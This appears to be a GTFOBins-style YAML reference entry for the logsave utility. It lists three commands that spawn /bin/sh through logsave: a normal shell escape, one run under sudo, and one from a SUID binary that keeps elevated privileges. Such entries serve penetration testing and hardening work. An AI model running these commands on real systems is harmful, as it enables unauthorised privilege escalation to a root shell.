---
functions:
  shell:
    - code: logsave temp.log /bin/sh
  sudo:
    - code: sudo logsave temp.log /bin/sh
  suid:
    - code: ./logsave temp.log /bin/sh -p
---
